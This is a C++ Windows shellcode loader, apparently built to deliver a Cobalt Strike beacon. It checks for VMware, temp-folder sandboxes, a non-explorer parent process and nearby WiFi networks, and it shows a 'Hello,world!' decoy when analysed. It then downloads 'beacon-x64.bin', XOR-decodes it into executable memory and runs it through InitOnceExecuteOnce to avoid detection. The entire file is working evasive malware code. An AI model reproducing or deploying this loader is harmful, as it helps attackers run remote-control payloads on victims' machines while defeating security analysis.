#include <iostream>
#include <Windows.h>
#include <Wininet.h>
#include <setupapi.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <winreg.h>
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "Setupapi.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

using namespace std;

bool regCheck() {
    HKEY hkey;
    if (RegOpenKey(HKEY_CLASSES_ROOT, "\\Applications\\VMwareHostOpen.exe", &hkey) == ERROR_SUCCESS) {
        return true;
    }
    else {
        return false;
    }

}
string GetCurrentWorkPath()
{
    char buffer[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, buffer);

    return buffer;
}


void tbCheck()
{
    string currentWorkPath = GetCurrentWorkPath();
    if (currentWorkPath.find("tmp") != string::npos)
    {
        exit(0);
    }
}
DWORD GetProcessIDByName(const char* processName)
{
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32))
        return 0;

    do
    {
        if (lstrcmpi(pe32.szExeFile, processName) == 0)
        {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}


DWORD GetCurrentProcessParentID()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    DWORD currentPID = GetCurrentProcessId();
    DWORD parentPID = 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32))
        return 0;

    do
    {
        if (pe32.th32ProcessID == currentPID)
        {
            parentPID = pe32.th32ParentProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);

    return parentPID;
}


DWORD GetExplorerProcessID()
{
    return GetProcessIDByName("explorer.exe");
}


void whoisyourdad()
{
    DWORD currentProcessParentID = GetCurrentProcessParentID();
    DWORD explorerProcessID = GetExplorerProcessID();

    if (currentProcessParentID != explorerProcessID)
    {
        exit(0);
    }
}

VOID WlanNotification(WLAN_NOTIFICATION_DATA* wlanNotifData, VOID* p)
{
    if (wlanNotifData->NotificationCode == wlan_notification_acm_scan_complete)
    {
        bool bWait = false;
    }
    else if (wlanNotifData->NotificationCode == wlan_notification_acm_scan_fail)
    {
        bool bWait = false;
    }
}

bool whereisWIFI()
{
    HANDLE hWlan = NULL;

    DWORD dwError = 0;
    DWORD dwSupportedVersion = 0;
    DWORD dwClientVersion = (TRUE ? 2 : 1);

    GUID guidInterface; ZeroMemory(&guidInterface, sizeof(GUID));

    WLAN_INTERFACE_INFO_LIST* wlanInterfaceList = (WLAN_INTERFACE_INFO_LIST*)WlanAllocateMemory(sizeof(WLAN_INTERFACE_INFO_LIST));
    ZeroMemory(wlanInterfaceList, sizeof(WLAN_INTERFACE_INFO_LIST));

    WLAN_AVAILABLE_NETWORK_LIST* wlanNetworkList = (WLAN_AVAILABLE_NETWORK_LIST*)WlanAllocateMemory(sizeof(WLAN_AVAILABLE_NETWORK_LIST));
    ZeroMemory(wlanNetworkList, sizeof(WLAN_AVAILABLE_NETWORK_LIST));

    int xxx = 0;

    try
    {
        if (dwError = WlanOpenHandle(dwClientVersion, NULL, &dwSupportedVersion, &hWlan) != ERROR_SUCCESS)
            return FALSE;

        if (dwError = WlanEnumInterfaces(hWlan, NULL, &wlanInterfaceList) != ERROR_SUCCESS)
            return FALSE;

        if (dwError = wlanInterfaceList->InterfaceInfo[0].isState != wlan_interface_state_not_ready)
        {
            if (wlanInterfaceList->dwNumberOfItems > 1)
            {
                guidInterface = wlanInterfaceList->InterfaceInfo[0].InterfaceGuid;
            }
            else
            {
                guidInterface = wlanInterfaceList->InterfaceInfo[0].InterfaceGuid;
            }
        }
        else
            return FALSE;

        DWORD dwPrevNotif = 0;
        bool bWait = true;


        if (dwError = WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
            (WLAN_NOTIFICATION_CALLBACK)WlanNotification, NULL, NULL, &dwPrevNotif) != ERROR_SUCCESS)
            return FALSE;

        if (dwError = WlanScan(hWlan, &guidInterface, NULL, NULL, NULL) != ERROR_SUCCESS)
            return FALSE;

        Sleep(100);

        // Unregister callback, don't care if it succeeds or not
        WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_NONE, TRUE, NULL, NULL, NULL, &dwPrevNotif);

        if (dwError = WlanGetAvailableNetworkList(hWlan, &guidInterface, NULL, NULL, &wlanNetworkList) != ERROR_SUCCESS)
            return FALSE;

        for (unsigned int i = 0; i < wlanNetworkList->dwNumberOfItems; i++)
        {
            xxx++;
        }
    }
    catch (char* szError)
    {
        return FALSE;
    }

    if (wlanNetworkList)
        WlanFreeMemory(wlanNetworkList);
    if (wlanInterfaceList)
        WlanFreeMemory(wlanInterfaceList);
    if (hWlan)
        WlanCloseHandle(hWlan, NULL);

    if (xxx > 0)
        return TRUE;
}

int main() {

    whoisyourdad();
    tbCheck();
    if (regCheck()) {
        printf("Hello,world!");
        return 0;
    }
    HINTERNET inet = InternetOpenA("Python api test", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (inet == NULL) {
        cout << "Error opening internet connection: " << GetLastError() << endl;
        return 1;
    }
    HINTERNET url = InternetOpenUrlA(inet, "http://localhost/beacon-x64.bin", NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (url == NULL) {
        cout << "Error opening URL: " << GetLastError() << endl;
        InternetCloseHandle(inet);
        return 1;
    }

    DWORD size = 295940;

    if (!InternetQueryDataAvailable(url, &size, 0, 0)) {
         cout << "Error getting shellcode size: " << GetLastError() << endl;
         InternetCloseHandle(url);
         InternetCloseHandle(inet);
         return 1;
     }

     // Allocate memory and read the shellcode into it
    LPVOID testcodes = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (testcodes == NULL) {
        cout << "Error allocating memory for testcodes: " << GetLastError() << endl;
        InternetCloseHandle(url);
        InternetCloseHandle(inet);
        return 1;
    }

    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;


    do {
        if (!InternetReadFile(url, (LPVOID)((DWORD)testcodes + totalBytesRead), size - totalBytesRead, &bytesRead)) {
            cout << "Error reading testcodes: " << GetLastError() << endl;
            InternetCloseHandle(url);
            InternetCloseHandle(inet);
            VirtualFree(testcodes, 0, MEM_RELEASE);
            return 1;
        }
        totalBytesRead += bytesRead;

    } while (bytesRead > 0 && totalBytesRead < size);


    InternetCloseHandle(url);
    InternetCloseHandle(inet);
    
    for (DWORD i = 0; i < size; i++) {
        *((LPBYTE)testcodes + i) = *((LPBYTE)testcodes + i) ^ 88;
    }
    whereisWIFI();
    //((void(*)())testcodes)();
    PVOID lpContext;
    BOOL  bStatus;

    INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;

    ::InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)testcodes, NULL, &lpContext);

    VirtualFree(testcodes, 0, MEM_RELEASE);

    return 0;
}
